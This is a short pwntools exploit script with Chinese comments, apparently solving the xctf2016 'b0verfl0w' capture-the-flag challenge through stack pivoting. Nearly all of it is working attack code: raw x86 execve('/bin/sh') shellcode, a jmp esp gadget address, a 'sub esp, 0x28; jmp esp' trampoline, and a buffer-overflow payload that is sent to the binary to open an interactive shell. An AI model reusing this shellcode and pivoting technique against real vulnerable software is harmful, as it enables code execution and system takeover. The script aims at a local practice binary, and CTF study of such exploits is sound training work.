# 栈迁移 stack pivoting
# xctf2016_b0verfl0w.zip
# gdb pwn \n vmmap 可以看可写入地址
from pwn import *

context(log_level='debug', arch='i386', os='linux')
io = gdb.debug('./pwn', 'b *0x08048595\nc')  # 条件断点

# 一定要用 b''。否则flat用 utf格式编码字符就不对了
shellcode_x86 = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

jmp_esp_1 = 0x08048504                   # jmp esp
jmp_esp_2 = asm('sub esp, 0x28;jmp esp') # 0x20 + leave(中pop ebp-4B) + ret(pop ebp-4B)  , 这里是机器码不是地址, 不能用jmp_esp_1
# 可以执行完 ret后 distance 0xffb91fb8(shellcode地址) $esp, 看一下距离然后在上面 0x28 替换

payload = flat(shellcode_x86.ljust(0x20, b'a'), 'B' * 4, jmp_esp_1, jmp_esp_2)
io.sendline(payload)

io.interactive()
